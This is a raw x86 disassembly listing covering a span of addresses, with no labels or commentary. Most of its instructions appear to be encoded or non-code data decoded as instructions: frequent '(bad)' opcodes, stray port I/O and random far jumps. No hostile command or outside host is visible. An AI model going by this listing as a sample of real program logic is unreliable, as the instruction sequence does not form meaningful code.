  423c3e:	in     eax,dx
  423c3f:	cmp    BYTE PTR ds:0x8d4d4d4d,bl
  423c45:	in     eax,dx
  423c46:	cmp    BYTE PTR ds:0x8d4d4d4d,ah
  423c4c:	add    DWORD PTR [ecx],eax
  423c4e:	and    eax,0x964d4d4d
  423c53:	dec    ebp
  423c54:	xlat   BYTE PTR ds:[ebx]
  423c55:	add    DWORD PTR ds:[ecx],eax
  423c58:	sbb    eax,0x4d4d4d4d
  423c5d:	xlat   BYTE PTR ds:[ebx]
  423c5e:	test   BYTE PTR [esi+0x4daff080],dl
  423c64:	sahf   
  423c65:	and    DWORD PTR [eax-0x4d128910],eax
  423c6b:	jno    0x423c03
  423c6d:	or     al,BYTE PTR [esi+0x4d4d8832]
  423c73:	push   eax
  423c74:	ja     0x423cd8
  423c76:	xor    BYTE PTR [edi-0x11],0x80
  423c7a:	lock adc BYTE PTR cs:[edi+0x32cd802e],0x3a
  423c83:	lea    ecx,[ebp+0x7e531153]
  423c89:	mov    dl,0xbe
  423c8b:	or     al,0xb2
  423c8d:	clc    
  423c8e:	sub    edi,edi
  423c90:	(bad)  
  423c91:	xchg   esi,eax
  423c92:	xor    al,0xf9
  423c95:	adc    BYTE PTR [edi+0x531153f9],0x7e
  423c9c:	mov    dl,0xbe
  423c9e:	or     al,0xb2
  423ca0:	clc    
  423ca1:	sub    edi,edi
  423ca3:	(bad)  
  423ca4:	xchg   esi,eax
  423ca5:	dec    ebp
  423ca6:	xlat   BYTE PTR ds:[ebx]
  423ca7:	dec    bp
  423ca9:	or     bl,BYTE PTR ds:0xb2627780
  423caf:	push   0xc
  423cb1:	push   ebx
  423cb2:	jl     0x423d17
  423cb4:	jl     0x423c36
  423cb6:	ja     0x423ca7
  423cb8:	xor    al,0x2e
  423cbb:	or     ch,0x32
  423cbe:	cmp    cl,BYTE PTR [ebp+0x2e97808d]
  423cc4:	xlat   BYTE PTR ds:[ebx]
  423cc5:	push   ebp
  423cc6:	push   ebx
  423cc7:	adc    DWORD PTR [ebx+0x7e],edx
  423cca:	mov    dl,0xbe
  423ccc:	or     al,0xb2
  423cce:	clc    
  423ccf:	sub    edi,edi
  423cd1:	(bad)  
  423cd2:	xchg   esi,eax
  423cd3:	xor    al,0xf9
  423cd6:	adc    BYTE PTR [edi+0x531153f9],0x7e
  423cdd:	mov    dl,0xbe
  423cdf:	or     al,0xb2
  423ce1:	clc    
  423ce2:	sub    edi,edi
  423ce4:	(bad)  
  423ce5:	xchg   esi,eax
  423ce6:	dec    ebp
  423ce7:	xlat   BYTE PTR ds:[ebx]
  423ce8:	jbe    0x423d37
  423cea:	or     bl,BYTE PTR ds:0x50847780
  423cf0:	ja     0x423d68
  423cf2:	xor    BYTE PTR [edi+0x3e],0x50
  423cf6:	ja     0x423c82
  423cf8:	les    edi,FWORD PTR [ecx]
  423cfa:	push   ebx
  423cfb:	adc    DWORD PTR [ebx+0x7e],edx
  423cfe:	mov    dl,0xbe
  423d00:	or     al,0xb2
  423d02:	clc    
  423d03:	sub    edi,edi
  423d05:	(bad)  
  423d06:	xchg   esi,eax
  423d07:	xor    al,0xf9
  423d0a:	adc    BYTE PTR [edi+0x531153f9],0x7e
  423d11:	mov    dl,0xbe
  423d13:	or     al,0xb2
  423d15:	clc    
  423d16:	sub    edi,edi
  423d18:	(bad)  
  423d19:	xchg   esi,eax
  423d1a:	dec    ebp
  423d1b:	xlat   BYTE PTR ds:[ebx]
  423d1c:	test   BYTE PTR [ebp+0xa],cl
  423d1f:	sbb    eax,0x508a7780
  423d24:	ja     0x423d44
  423d26:	xor    BYTE PTR [edi+0x76],0x50
  423d2a:	out    0x56,eax
  423d2c:	push   eax
  423d2d:	ja     0x423d91
  423d2f:	jl     0x423da8
  423d31:	xor    ch,0x24
  423d34:	outs   dx,DWORD PTR ds:[esi]
  423d35:	cmp    BYTE PTR [eax-0xf7fa989],al
  423d3b:	push   esi
  423d3c:	push   ebx
  423d3d:	cld    
  423d3e:	push   ebx
  423d3f:	adc    DWORD PTR [edx-0x414dd67c],esi
  423d45:	or     al,0xff
  423d47:	mov    dl,0x50
  423d49:	ja     0x423d91
  423d4b:	xor    BYTE PTR [edi+0x56],0x80
  423d4f:	lock push esi
  423d51:	push   ebx
  423d52:	cld    
  423d53:	push   ebx
  423d54:	adc    DWORD PTR [edx-0x414dd67c],esi
  423d5a:	or     al,0xff
  423d5c:	mov    dl,0x50
  423d5e:	ja     0x423d0f
  423d60:	jl     0x423dd9
  423d62:	jp     0x423dad
  423d64:	and    al,0x6f
  423d66:	cmp    BYTE PTR [edi+esi*2-0x7c],bh
  423d6a:	fisub  WORD PTR [edi+ebp*2]
  423d6d:	cmp    BYTE PTR [eax-0xf7fa989],al
  423d73:	push   esi
  423d74:	push   ebx
  423d75:	cld    
  423d76:	push   ebx
  423d77:	adc    DWORD PTR [edx-0x7b4df342],esi
  423d7d:	sub    edi,edi
  423d7f:	mov    dl,0x80
  423d81:	lock push ds
  423d83:	arpl   bp,di
  423d85:	or     DWORD PTR [edi],ecx
  423d87:	pop    ss
  423d88:	in     al,dx
  423d89:	lea    ecx,[ebp-0x72f35f42]
  423d8f:	lea    eax,[eax+0x77807af0]
  423d95:	jp     0x423d17
  423d97:	xchg   edi,eax
  423d98:	inc    esi
  423d99:	push   ebx
  423d9a:	je     0x423def
  423d9c:	push   ecx
  423d9d:	mov    dl,0x86
  423d9f:	or     al,0xb2
  423da1:	mov    edx,0x80fdff29
  423da6:	ja     0x423dc6
  423da8:	inc    ebx
  423da9:	sti    
  423daa:	push   ebx
  423dab:	jb     0x423df8
  423dad:	add    eax,0x80af7750
  423db2:	ja     0x423d38
  423db4:	xor    al,0x84
  423db7:	push   ebx
  423db8:	cld    
  423db9:	push   ebx
  423dba:	adc    DWORD PTR [edx-0x7b4df342],esi
  423dc0:	sub    edi,edi
  423dc2:	mov    dl,0x80
  423dc4:	lock scas eax,DWORD PTR es:[edi]
  423dc6:	arpl   bp,di
  423dc8:	fst    DWORD PTR [edi]
  423dca:	xor    BYTE PTR [edi-0x7c],0x80
  423dce:	lock test BYTE PTR [ebx-0x4],dl
  423dd2:	push   ebx
  423dd3:	adc    DWORD PTR [edx-0x414dd67c],esi
  423dd9:	or     al,0xff
  423ddb:	mov    dl,0x50
  423ddd:	ja     0x423d8e
  423ddf:	xor    BYTE PTR [edi+0x7a],0x80
  423de3:	lock jp 0x423e39
  423de6:	cld    
  423de7:	push   ebx
  423de8:	adc    DWORD PTR [edx-0x414dd67c],esi
  423dee:	or     al,0xff
  423df0:	mov    dl,0x80
  423df2:	lock scas eax,DWORD PTR es:[edi]
  423df4:	or     DWORD PTR [edx],esp
  423df6:	mov    dl,0x50
  423df8:	ja     0x423da9
  423dfa:	xor    BYTE PTR [edi+0x56],0x80
  423dfe:	lock push esi
  423e00:	push   ebx
  423e01:	cld    
  423e02:	push   ebx
  423e03:	adc    DWORD PTR [edx-0x7b4df342],esi
  423e09:	sub    edi,edi
  423e0b:	mov    dl,0x80
  423e0d:	lock scas eax,DWORD PTR es:[edi]
  423e0f:	arpl   bp,di
  423e11:	or     DWORD PTR [edi],ecx
  423e13:	(bad)  
  423e14:	or     al,0x8d
  423e16:	lea    eax,[eax+0x7750af77]
  423e1c:	scas   eax,DWORD PTR es:[edi]
  423e1d:	xor    BYTE PTR [edi+0x46],0xec
  423e21:	ja     0x423e85
  423e23:	push   eax
  423e24:	out    0x3e,eax
  423e26:	push   eax
  423e27:	ja     0x423e87
  423e29:	pop    esi
  423e2a:	cmc    
  423e2b:	and    al,0x6f
  423e2d:	cmp    BYTE PTR [eax+0x77],dl
  423e30:	push   0x7c
  423e32:	ja     0x423e9a
  423e34:	hlt    
  423e35:	and    al,0x6f
  423e37:	cmp    BYTE PTR [edi+esi*2+0x26],bh
  423e3b:	repz and al,0x6f
  423e3e:	cmp    BYTE PTR [eax+0x77],dl
  423e41:	test   DWORD PTR [eax-0xf7fc189],0x53fc533e
  423e4b:	adc    DWORD PTR [edx-0x414dd67c],esi
  423e51:	or     al,0xff
  423e53:	mov    dl,0x50
  423e55:	ja     0x423e54
  423e57:	sub    BYTE PTR [edx-0x42],0x4f
  423e5b:	cmp    cl,BYTE PTR [ebp+0x7c6a808d]
  423e61:	dec    edi
  423e62:	xor    DWORD PTR [ebp+0x4d],ecx
  423e65:	dec    ebp
  423e66:	jmp    0x7c6a:0x80386f24
  423e6d:	dec    edi
  423e6e:	jge    0x423ebd
  423e70:	dec    ebp
  423e71:	dec    ebp
  423e72:	or     esp,DWORD PTR [edi+ebp*2]
  423e75:	cmp    BYTE PTR [eax-0x7f957f96],al
  423e7b:	ja     0x423e74
  423e7d:	xor    al,0xf7
  423e80:	push   ebx
  423e81:	cld    
  423e82:	push   ebx
  423e83:	adc    DWORD PTR [edx-0x414dd67c],esi
  423e89:	or     al,0xff
  423e8b:	mov    dl,0x80
  423e8d:	lock std 
  423e8f:	or     DWORD PTR [edx],esp
  423e91:	mov    dl,0x80
  423e93:	lock pop esi
  423e95:	(bad)  
  423e96:	out    dx,al
  423e97:	out    dx,eax
  423e98:	adc    BYTE PTR [edi-0x54],dh
  423e9b:	sub    BYTE PTR [edx-0x80],0x77
  423e9f:	test   DWORD PTR [eax+0x1153f7f0],0xbeb2fc53
  423ea9:	or     al,0xb2
  423eab:	test   BYTE PTR [ecx],ch
  423ead:	push   DWORD PTR [edx+0x9fdf080]
  423eb3:	and    dh,BYTE PTR [edx-0x7f990f80]
  423eb9:	xchg   edi,eax
  423eba:	push   bx
  423ebc:	push   ecx
  423ebd:	push   ebx
  423ebe:	xchg   esp,eax
  423ebf:	mov    dl,0xba
  423ec1:	sub    DWORD PTR [edx-0x100f3f9],esi
  423ec7:	in     al,dx
  423ec8:	mov    dl,0x80
  423eca:	lock pop esi
  423ecc:	or     eax,esp
  423ece:	and    edi,ebp
  423ed0:	or     BYTE PTR [edi+0x31],0x4d
  423ed4:	dec    ebp
  423ed5:	dec    ebp
  423ed6:	sbb    BYTE PTR [eax],0x31
  423ed9:	dec    ebp
  423eda:	dec    ebp
  423edb:	dec    ebp
  423edc:	push   ebx
  423edd:	cld    
  423ede:	push   ebx
  423edf:	xchg   esp,eax
  423ee0:	mov    dl,0x84
  423ee2:	sub    DWORD PTR [edx-0x400f3f9],esi
  423ee8:	in     al,dx
  423ee9:	mov    dl,0x9
  423eeb:	loopne 0x423edd
  423eed:	lods   al,BYTE PTR ds:[esi]
  423eee:	push   ebx
  423eef:	std    
  423ef0:	adc    al,dh
  423ef2:	lods   al,BYTE PTR ds:[esi]
  423ef3:	sub    BYTE PTR [edx-0x71],0x77
  423ef7:	lods   al,BYTE PTR ds:[esi]
  423ef8:	xor    al,0xf7
  423efb:	adc    BYTE PTR [edi+0x535153f7],0x94
  423f02:	mov    dl,0x7
  423f04:	or     al,0xb2
  423f06:	mov    edx,0x80feff29
  423f0b:	xchg   edi,eax
  423f0c:	std    
  423f0d:	or     DWORD PTR [edx],esp
  423f0f:	inc    BYTE PTR [eax-0x11efa169]
  423f15:	push   cs
  423f16:	sub    BYTE PTR [edx-0x80],0x77
  423f1a:	test   DWORD PTR [eax-0x3ac0810],0x84b21153
  423f24:	sub    DWORD PTR [edx-0x4d00f342],esi
  423f2a:	xor    al,0xfd
  423f2d:	or     DWORD PTR [edx],esp
  423f2f:	mov    dl,0x80
  423f31:	lock pop esi
  423f33:	(bad)  
  423f34:	out    dx,al
  423f35:	out    dx,eax
  423f36:	adc    BYTE PTR [edi-0x54],dh
  423f39:	sub    BYTE PTR [edx-0x80],0x77
  423f3d:	test   DWORD PTR [eax-0x3ac0810],0x532984b2
  423f47:	adc    DWORD PTR [edx-0x4d00f342],esi
  423f4d:	xor    al,0xfd
  423f50:	or     DWORD PTR [edx],esp
  423f52:	mov    dl,0x80
  423f54:	lock push 0xffffff80
  423f57:	xchg   edi,eax
  423f58:	push   0x53
  423f5a:	push   ecx
  423f5b:	push   ebx
  423f5c:	xchg   esp,eax
  423f5d:	mov    dl,0xba
  423f5f:	sub    DWORD PTR [edx-0x100f3f9],esi
  423f65:	in     al,dx
  423f66:	mov    dl,0x80
  423f68:	lock pop esi
  423f6a:	or     eax,esp
  423f6c:	and    edi,ebp
  423f6e:	or     BYTE PTR [edi+0x7d],0x4d
  423f72:	dec    ebp
  423f73:	dec    ebp
  423f74:	sbb    BYTE PTR [eax],0x7d
  423f77:	dec    ebp
  423f78:	dec    ebp
  423f79:	dec    ebp
  423f7a:	push   ebx
  423f7b:	cld    
  423f7c:	push   ebx
  423f7d:	xchg   esp,eax
  423f7e:	mov    dl,0x84
  423f80:	sub    DWORD PTR [edx-0x400f3f9],esi
  423f86:	in     al,dx
  423f87:	mov    dl,0x9
  423f89:	loopne 0x423f7b
  423f8b:	lods   al,BYTE PTR ds:[esi]
  423f8c:	push   ebx
  423f8d:	std    
  423f8e:	adc    al,dh
  423f90:	lods   al,BYTE PTR ds:[esi]
  423f91:	sub    BYTE PTR [edx-0x71],0x77
  423f95:	lods   al,BYTE PTR ds:[esi]
  423f96:	xor    al,0xf7
  423f99:	adc    BYTE PTR [edi+0x535153f7],0x94
  423fa0:	mov    dl,0x7
  423fa2:	or     al,0xb2
  423fa4:	mov    edx,0x80feff29
  423fa9:	xchg   edi,eax
  423faa:	std    
  423fab:	or     DWORD PTR [edx],esp
  423fad:	inc    BYTE PTR [eax-0x11efa169]
  423fb3:	push   cs
  423fb4:	sub    BYTE PTR [edx-0x80],0x77
  423fb8:	es xor al,0x26
  423fbc:	push   ebx
  423fbd:	adc    DWORD PTR [ebx-0x4],edx
  423fc0:	mov    dl,0xbe
  423fc2:	or     al,0xb2
  423fc4:	test   BYTE PTR [ecx],ch
  423fc6:	push   DWORD PTR [edx-0x7f950f80]
  423fcc:	xchg   edi,eax
  423fcd:	push   0x53
  423fcf:	push   ecx
  423fd0:	push   ebx
  423fd1:	xchg   esp,eax
  423fd2:	mov    dl,0xba
  423fd4:	sub    DWORD PTR [edx-0x100f3f9],esi
  423fda:	or     DWORD PTR [edx],esp
  423fdc:	mov    dl,0xec
  423fde:	ja     0x423fdd
  423fe0:	push   eax
  423fe1:	ja     0x423fe0
  423fe3:	xor    BYTE PTR [edi-0x3],0x80
  423fe7:	lock scas eax,DWORD PTR es:[edi]
  423fe9:	arpl   bp,di
  423feb:	or     edx,ebp
  423fed:	(bad)  
  423fee:	or     eax,0x77804d4d
  423ff3:	push   0xffffff80
  423ff5:	lock push 0x53
  423ff8:	adc    DWORD PTR [edx-0x3acf342],esi
  423ffe:	mov    dl,0x84
  424000:	sub    edi,edi
  424002:	mov    dl,0x80
  424004:	lock scas eax,DWORD PTR es:[edi]
  424006:	or     DWORD PTR [edx],esp
  424008:	mov    dl,0x80
  42400a:	lock ds push ebx
  42400d:	push   ecx
  42400e:	mov    dl,0xba
  424010:	sub    edi,edi
  424012:	mov    dl,0x80
  424014:	lock ds push ebx
  424017:	adc    DWORD PTR [edx-0x4d00f342],esi
  42401d:	push   eax
  42401e:	ja     0x424086
  424020:	xor    BYTE PTR [edi-0x7e],0x80
  424024:	lock adc BYTE PTR [ebx+0x11],0xb2
  424029:	mov    esi,0xb2fc530c
  42402e:	test   BYTE PTR [ecx],ch
  424030:	push   DWORD PTR [edx-0x7f7d0f80]
  424036:	xchg   edi,eax
  424037:	adc    BYTE PTR [ebx+0x51],0xb2
  42403b:	mov    edx,0xb2945329
  424040:	pop    es
  424041:	or     al,0xff
  424043:	(bad)  
  424044:	in     al,dx
  424045:	lock data16 in al,dx
  424048:	std    
  424049:	in     al,dx
  42404a:	lock inc esi
  42404c:	push   eax
  42404d:	lock inc esi
  42404f:	les    ebx,FWORD PTR ds:0x80827780
  424055:	lock adc BYTE PTR [ebx-0x4],0x53
  42405a:	adc    DWORD PTR [edx-0x414dd67c],esi
  424060:	or     al,0xff
  424062:	mov    dl,0xec
  424064:	ja     0x4240ac
  424066:	push   eax
  424067:	ja     0x4240af
  424069:	xor    BYTE PTR [edi-0x7e],0x80
  42406d:	lock adc BYTE PTR [ebx-0x4],0xb2
  424072:	test   BYTE PTR [ecx],ch
  424074:	push   ebx
  424075:	adc    DWORD PTR [edx-0x4d00f342],esi
  42407b:	xor    al,0x1e
  42407e:	inc    ebx
  42407f:	std    
  424080:	xor    BYTE PTR [edi-0x7e],0x80
  424084:	xchg   edi,eax
  424085:	adc    BYTE PTR [ebx-0x4],0x53
  424089:	xchg   esp,eax
  42408a:	mov    dl,0x7
  42408c:	or     al,0xb2
  42408e:	test   BYTE PTR [ecx],ch
  424090:	(bad)  
  424091:	sti    
  424092:	adc    BYTE PTR [edi-0x4ddf6ba],0x63
  424099:	mov    dl,0x9
  42409b:	dec    esp
  42409c:	xor    cl,BYTE PTR [edx+0x77804d4d]
  4240a2:	out    dx,eax
  4240a3:	dec    ebp
  4240a4:	xlat   BYTE PTR ds:[ebx]
  4240a5:	and    DWORD PTR [ecx],eax
  4240a7:	ja     0x42402f
  4240a9:	dec    ebp
  4240aa:	xlat   BYTE PTR ds:[ebx]
  4240ab:	out    dx,eax
  4240ac:	or     al,BYTE PTR [eax-0x327f1089]
  4240b2:	jp     0x4240ee
  4240b4:	lea    ecx,[ebp+0x7780814d]
  4240ba:	out    dx,eax
  4240bb:	or     ch,0xf7
  4240be:	cmp    cl,BYTE PTR [ebp+0x4d814d8d]
  4240c4:	xlat   BYTE PTR ds:[ebx]
  4240c5:	mov    cl,BYTE PTR [ebp-0x29]
  4240c8:	jbe    0x424050
  4240ca:	test   eax,0x508d8def
  4240cf:	ja     0x424133
  4240d1:	xor    BYTE PTR [edi-0x75],0x80
  4240d5:	lock mov edx,DWORD PTR [ebx+0x74]
  4240d9:	push   ebx
  4240da:	push   ecx
  4240db:	mov    dl,0xba
  4240dd:	sub    DWORD PTR [edx-0x4d00f37a],esi
  4240e3:	xor    al,0x76
  4240e6:	arpl   WORD PTR [edx+0x778057d5],si
  4240ec:	out    dx,eax
  4240ed:	xor    al,0x2e
  4240f0:	adc    BYTE PTR [edi+0x32cd802e],0x3a
  4240f7:	lea    ecx,[ebp+0x7e531153]
  4240fd:	mov    dl,0xbe
  4240ff:	or     al,0xb2
  424101:	clc    
  424102:	sub    edi,edi
  424104:	(bad)  
  424105:	xchg   esi,eax
  424106:	xor    al,0x8b
  424109:	adc    BYTE PTR [edi+0x5311538b],0x7e
  424110:	mov    dl,0xbe
  424112:	or     al,0xb2
  424114:	clc    
  424115:	sub    edi,edi
  424117:	(bad)  
  424118:	xchg   esi,eax
  424119:	dec    ebp
  42411a:	xlat   BYTE PTR ds:[ebx]
  42411b:	jbe    0x42416a
  42411d:	or     bl,BYTE PTR ds:0x70a3a9ab
  424123:	sti    
  424124:	out    dx,eax
  424125:	lea    edx,[edi-0x78127880]
  42412b:	and    eax,0x80328099
  424130:	mov    ds:0x8d8d3a2e,al
  424135:	in     eax,dx
  424136:	pop    ebp
  424137:	lea    ecx,[ecx]
  424139:	(bad)  
  42413b:	cmp    cl,BYTE PTR [ebp+0x9724f8d]
  424141:	(bad)  
  424143:	cmp    cl,BYTE PTR [ebp+0x90b4f8d]
  424149:	jne    0x80cfcedc
  42414f:	dec    esp
  424150:	adc    BYTE PTR [ebp+0x6a4f8d8d],cl
  424156:	or     DWORD PTR [edi],ecx
  424158:	mov    esp,0xed8d8d8d
  42415d:	cli    
  42415e:	inc    ecx
  42415f:	lea    ecx,[ebp+0xf09718d]
  424165:	add    ecx,DWORD PTR [ebp-0x66a07273]
  42416b:	push   ebp
  42416c:	or     DWORD PTR [edi],ecx
  42416e:	mov    dh,0x8d
  424170:	lea    ecx,[ebp+0x3a268e80]
  424176:	lea    ecx,[ebp-0x72cd4813]
  42417c:	cmp    dh,0x43
  42417f:	mov    eax,ds:0x5c09fbec
  424184:	or     ah,BYTE PTR [ecx]
  424186:	push   eax
  424187:	lock stc 
  424189:	or     DWORD PTR [ebp+edi*2-0x5f],ebx
  42418d:	in     al,dx
  42418e:	dec    BYTE PTR [ecx]
  424190:	psadbw mm1,QWORD PTR [ebp+0x7d018d8d]
  424197:	adc    eax,0x86f05093
  42419c:	cli    
  42419d:	dec    ebp
  42419e:	dec    ebp
  42419f:	dec    ebp
  4241a0:	jmp    0x42413d
  4241a2:	dec    edi
  4241a3:	outs   dx,BYTE PTR ds:[esi]
  4241a4:	aad    0xeb
  4241a6:	or     BYTE PTR [esi],0xed
  4241a9:	mov    bh,0xc8
  4241ab:	lea    esi,[ebx]
  4241ad:	jle    0x42419b
  4241af:	test   DWORD PTR [ecx],0x9a1e65c
  4241b5:	pop    esp
  4241b6:	scas   al,BYTE PTR es:[edi]
  4241b7:	and    esp,ebp
  4241b9:	push   es
  4241ba:	aad    0xbf
  4241bc:	add    edx,ebx
  4241be:	adc    eax,0x4f87f050
  4241c3:	outs   dx,BYTE PTR ds:[esi]
  4241c4:	aad    0x92
  4241c6:	xor    BYTE PTR [eax],0xed
  4241c9:	mov    bh,0x8b
  4241cb:	lea    esi,[ebx]
  4241cd:	push   ecx
  4241ce:	in     al,dx
  4241cf:	std    
  4241d0:	or     DWORD PTR [edi+ebx*8-0x5f],ebx
  4241d4:	or     DWORD PTR [edi+ebx*4+0x21],ebx
  4241d8:	in     al,dx
  4241d9:	push   es
  4241da:	aad    0x43
  4241dc:	add    edi,ebx
  4241de:	adc    eax,0x808ae750
  4241e3:	out    0x8a,eax
  4241e5:	sub    BYTE PTR [ebx+0x4f],0x4d
  4241e9:	aad    0x6f
  4241eb:	and    BYTE PTR [edi-0x73dac507],0x9
  4241f2:	pop    esp
  4241f3:	fbld   TBYTE PTR [ecx+0x219f5c09]
  4241f9:	dec    ebp
  4241fa:	ja     0x424187
  4241fc:	in     eax,dx
  4241fd:	ja     0x424189
  4241ff:	out    dx,eax
  424200:	in     al,dx
  424201:	push   es
  424202:	pop    edi
  424203:	out    0x8b,eax
  424205:	in     al,0xa4
  424207:	or     DWORD PTR [esi+eiz*8-0x5f],ebx
  42420b:	or     DWORD PTR [esi+ebp*4+0x21],ebx
  42420f:	xor    al,0x87
  424212:	dec    ebp
  424213:	ja     0x4241dd
  424215:	in     eax,dx
  424216:	mov    dl,0xef
  424218:	in     al,dx
  424219:	push   es
  42421a:	push   eax
  42421b:	lock xchg DWORD PTR [edi-0x19],ebx
  42421f:	enter  0x2ee4,0x80
  424223:	lock xchg BYTE PTR [ecx],cl
  424226:	pop    esp
  424227:	or     ah,BYTE PTR [ecx+0x21dd5c09]
  42422d:	dec    ebp
  42422e:	ja     0x424262
  424230:	in     eax,dx
  424231:	mov    dl,0xef
  424233:	in     al,dx
  424234:	pushf  
  424235:	push   eax
  424236:	lock xchg BYTE PTR [edi-0x69],bl
  42423a:	xor    cl,BYTE PTR [ecx]
  42423c:	jmp    0xa3ab:0x4d4d4d9a
  424243:	push   ebx
  424244:	push   0x6d
  424246:	les    ecx,FWORD PTR [ebx+edx*2]
  424249:	push   0xffffffa9
  42424b:	jo     0x4242c1
  42424d:	xchg   edi,eax
  42424e:	add    BYTE PTR [edi+0x3a2e5080],0x8d
  424255:	lea    eax,[eax-0x7812de89]
  42425b:	jno    0x4241f0
  42425d:	push   ebx
  42425e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42425f:	cdq    
  424260:	fwait
  424261:	pop    edi
  424262:	pop    ds
  424263:	or     DWORD PTR [edi],ecx
  424265:	jmp    0xd574:0x638d8d8d
  42426c:	call   0xd81fdfd0
  424271:	das    
  424272:	push   ebx
  424273:	push   0x6d
  424275:	(bad)  
  424276:	fld    DWORD PTR [eax+0x77ecdd6d]
  42427c:	out    dx,eax
  42427d:	cmp    BYTE PTR [ebp+0x25],0x80
  424281:	or     dh,BYTE PTR ds:0x80155280
  424287:	fstp   QWORD PTR ds:0xeceff0ec
  42428d:	xchg   edi,eax
  42428e:	out    dx,eax
  42428f:	push   eax
  424290:	xlat   BYTE PTR ds:[ebx]
  424291:	mov    ah,BYTE PTR [ebx+0x4b]
  424294:	fucomi st,st(4)
  424296:	push   eax
  424297:	out    0x8a,eax
  424299:	push   eax
  42429a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42429b:	mov    ebx,DWORD PTR [edi-0x59]
  42429e:	mov    bl,cl
  4242a0:	mov    dh,0x63
  4242a2:	popf   
  4242a3:	adc    eax,0x5c096fd3
  4242a8:	push   ebp
  4242a9:	scas   al,BYTE PTR es:[edi]
  4242aa:	les    ecx,FWORD PTR [eax+eax*4]
  4242ad:	mov    BYTE PTR [ecx],0x55
  4242b0:	mov    es,WORD PTR [eax-0x2ab2b097]
  4242b6:	aas    
  4242b7:	in     al,dx
  4242b8:	out    0xef,eax
  4242ba:	push   eax
  4242bb:	out    0x32,eax
  4242bd:	arpl   WORD PTR [ebx-0x587f8e27],cx
  4242c3:	and    DWORD PTR [eax-0x7d131a5d],eax
  4242c9:	arpl   WORD PTR [esi],ax
  4242cb:	shr    esi,cl
  4242cd:	sbb    BYTE PTR [ecx-0x3c],0xef
  4242d1:	inc    ebx
  4242d2:	out    0xef,eax
  4242d4:	push   eax
  4242d5:	imul   eax,DWORD PTR [eax+0xb4f32d7],0xa780a1d5
  4242df:	mov    esi,DWORD PTR [ebx+0x50]
  4242e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4242e3:	mov    esp,DWORD PTR [ebx-0x59]
  4242e6:	mov    ah,ah
  4242e8:	pop    esi
  4242e9:	(bad)  
  4242ea:	into   
  4242eb:	push   ebx
  4242ec:	push   0xffffffab
  4242ee:	test   eax,0xeffb70a3
  4242f3:	lea    edx,[edi-0x78127880]
  4242f9:	adc    DWORD PTR [ebx+0x24f65e99],0x7750386f
  424303:	mov    bh,BYTE PTR [edi+esi*2-0x75]
  424307:	cmc    
  424308:	and    al,0x6f
  42430a:	cmp    BYTE PTR [eax-0x587f7510],al
  424310:	mov    bl,BYTE PTR [ebx+0x52010de2]
  424316:	cmp    dl,BYTE PTR [ebx+0x51]
  424319:	mov    dl,0xbe
  42431b:	or     al,0xab
  42431d:	push   ebx
  42431e:	lods   al,BYTE PTR ds:[esi]
  42431f:	mov    dl,0xb4
  424321:	sub    edi,edi
  424323:	adc    DWORD PTR [eax-0x10],edx
  424326:	xchg   BYTE PTR [eax-0xf7f7510],al
  42432c:	mov    al,BYTE PTR [eax-0xf7f7510]
  424332:	mov    al,BYTE PTR [eax-0xf7f7510]
  424338:	mov    al,BYTE PTR [eax-0xf7f7510]
  42433e:	mov    al,BYTE PTR [eax-0xf7f7510]
  424344:	mov    bh,BYTE PTR [edi+esi*2+0x32]
  424348:	fsincos 
  42434a:	lods   al,BYTE PTR ds:[esi]
  42434b:	pop    eax
  42434c:	xor    al,0x8a
  42434f:	and    BYTE PTR [edi+0x53ac538a],0x51
  424356:	mov    dl,0xb4
  424358:	sub    DWORD PTR [edx+0x11ff0cbe],esi
  42435e:	and    BYTE PTR [edi+0x2e248021],0x3a
  424365:	lea    ecx,[ebp+0xf09ff63]
  42436b:	sbb    ah,ch
  42436d:	lea    ecx,[ebp-0x7f750f80]
  424373:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424374:	mov    dl,BYTE PTR [ebx+0x51]
  424377:	push   ebx
  424378:	lods   al,BYTE PTR ds:[esi]
  424379:	mov    dl,0xbe
  42437b:	or     al,0xb2
  42437d:	mov    ah,0x29
  42437f:	call   DWORD PTR [ecx]
  424381:	arpl   si,di
  424383:	or     DWORD PTR [edi],ecx
  424385:	jecxz  0x424373
  424387:	lea    ecx,[ebp-0x72327080]
  42438d:	lea    ecx,[ebp-0x7f756880]
  424393:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424394:	mov    dl,BYTE PTR [ebx+0x7e]
  424397:	push   ebx
  424398:	lods   al,BYTE PTR ds:[esi]
  424399:	mov    dl,0x7
  42439b:	or     al,0xb2
  42439d:	mov    ah,0x29
  42439f:	call   DWORD PTR [ebx+eiz*2-0x6cf0f602]
  4243a6:	in     al,dx
  4243a7:	lea    ecx,[ebp+0x50eff0ec]
  4243ad:	lock test DWORD PTR [eax-0x7f81ac09],0xb2ac5382
  4243b8:	pop    es
  4243b9:	or     al,0xb2
  4243bb:	mov    ah,0x29
  4243bd:	call   DWORD PTR [eax+edx*2-0x687fcd69]
  4243c4:	xor    ah,BYTE PTR [ebx-0x9]
  4243c7:	aad    0x27
  4243c9:	xor    BYTE PTR [edi-0x76],0x80
  4243cd:	xchg   edi,eax
  4243ce:	mov    dl,BYTE PTR [ebx-0x64]
  4243d1:	push   ebx
  4243d2:	cld    
  4243d3:	mov    dl,0xf8
  4243d5:	sub    DWORD PTR [edx-0x400f37a],esi
  4243db:	adc    BYTE PTR [edi+0x1572c332],0x5f
  4243e2:	out    dx,al
  4243e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4243e4:	xlat   BYTE PTR ds:[ebx]
  4243e5:	rol    BYTE PTR [eax-0x687f7589],0x8a
  4243ec:	push   ebx
  4243ed:	pushf  
  4243ee:	push   ebx
  4243ef:	cld    
  4243f0:	mov    dl,0xf8
  4243f2:	sub    DWORD PTR [edx-0x400f37a],esi
  4243f8:	adc    BYTE PTR [edi+0x1572c332],0x5f
  4243ff:	jne    0x4243a7
  424401:	jno    0x42440c
  424403:	push   gs
  424405:	or     al,0x8d
  424407:	lea    eax,[eax+0x77808a77]
  42440d:	mov    al,BYTE PTR [eax+0x77808aa7]
  424413:	mov    dl,BYTE PTR [ebx+0x7c]
  424416:	push   ebx
  424417:	add    al,0xb2
  424419:	test   BYTE PTR [ecx],ch
  42441b:	mov    dl,0xc4
  42441d:	or     al,0xff
  42441f:	add    BYTE PTR [eax+0x6ac33277],0x15
  424426:	in     al,dx
  424427:	mov    dl,0x80
